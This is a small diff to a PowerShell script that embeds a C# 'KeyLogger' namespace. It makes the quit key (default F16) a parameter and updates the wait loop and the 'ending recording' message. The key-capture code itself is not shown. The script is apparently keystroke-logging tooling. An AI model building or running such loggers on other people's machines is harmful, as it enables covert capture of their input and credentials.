@@ -1,3 +1,7 @@
+param(
+  [string]$quitKey = "F16"
+)
+
 Add-Type -TypeDefinition '
 
 using System;
@@ -53,10 +57,10 @@ namespace KeyLogger{
 }
 ' -ReferencedAssemblies System.Windows.Forms
 
-while ($keyPress -ne "F16") {
+while ($keyPress -ne $quitKey) {
     $keyPress = [System.Windows.Forms.Keys][KeyLogger.Program]::WaitForKey()
 }
 
-Write-Host "`nCaught F16, ending recording..." -ForegroundColor Green
+Write-Host "`nCaught $quitKey, ending recording..." -ForegroundColor Green
 
 exit
